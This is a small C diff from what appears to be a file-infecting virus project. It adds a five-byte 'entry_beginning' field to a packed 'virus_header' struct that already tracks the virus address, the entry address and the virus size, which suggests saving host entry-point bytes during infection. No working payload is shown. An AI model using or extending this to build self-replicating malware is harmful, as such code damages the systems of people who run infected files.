@@ -30,6 +30,7 @@ struct			virus_header
 	uint64_t	relative_virus_address;
 	uint64_t	relative_entry_address;
 	uint64_t	virus_size;
+	uint8_t		entry_beginning[5];
 }__attribute__((packed));
 
 void		virus_header_struct(void);
